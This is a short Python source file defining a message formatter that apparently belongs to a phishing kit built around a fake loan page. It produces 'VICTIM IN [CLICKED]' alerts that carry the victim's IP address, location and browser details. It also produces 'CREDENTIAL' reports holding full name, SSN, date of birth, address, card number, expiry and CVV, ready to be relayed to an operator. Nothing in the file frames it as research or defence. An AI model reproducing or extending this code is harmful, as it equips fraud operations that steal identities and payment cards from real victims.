
class MessageGateWay:

    def __init__(self, data):
        self.data = data

    def dispatch_message(self):

        match self.data.get("type"):

            case 'click':
                return (
                    f"*VICTIM IN [CLICKED]:* \n\n"
                    f"*[BROWSER]*: `{self.data.get('click')['USER_AGENT']}\n`"
                    f"*[CITY]*: `{self.data.get('click')['CITY']}\n`"
                    f"*[COUNTRY]*: `{self.data.get('click')['COUNTRY']}\n`"
                    f"*[REGION]*: `{self.data.get('click')['REGION']}\n`"
                    f"*[IP ADDRESS]*: `{self.data.get('click')['IP']}\n`"
                    f"*[WEB DRIVER]*: `{self.data.get('click')['WEB_DRIVER']}\n`"
                )
            case "personal":
                return (
                    f"*CREDENTIAL:*\n\n"
                    f"*[FULL_NAME]*: `{self.data.get('full_name')}\n`"
                    f"*[PHONE_NUMBER]*: `{self.data.get('phone_number')}\n`"
                    f"*[EMAIL]*: `{self.data.get('email')}\n`"
                    f"*[DOB]*: `{self.data.get('dob')}\n`"
                    f"*[SSN]*: `{self.data.get('ssn')}\n`"
                    f"*[STREET_ADDRESS]*: `{self.data.get('street_address')}\n`"
                    f"*[STATE]*: `{self.data.get('state')}\n`"
                    f"*[CITY]*: `{self.data.get('city')}\n`"
                    f"*[ZIP_CODE]*: `{self.data.get('zip_code')}\n`"
                    f"*[LOAN_AMOUNT]*: `{self.data.get('loan_amount')}\n`"
                    f"*[ADDRESS]*: `{self.data.get('address')}\n`"
                    f"*[CARD_NUMBER]*: `{self.data.get('card_number')}\n`"
                    f"*[CARD_NAME]*: `{self.data.get('card_name_input')}\n`"
                    f"*[BILLING_ADDRESS]*: `{self.data.get('billing_address')}\n`"
                    f"*[EXPIRY_NUMBER]*: `{self.data.get('expiry_number')}\n`"
                    f"*[CVV]*: `{self.data.get('cvv')}\n`"
                )
            case _:
                return "Unknown message type"
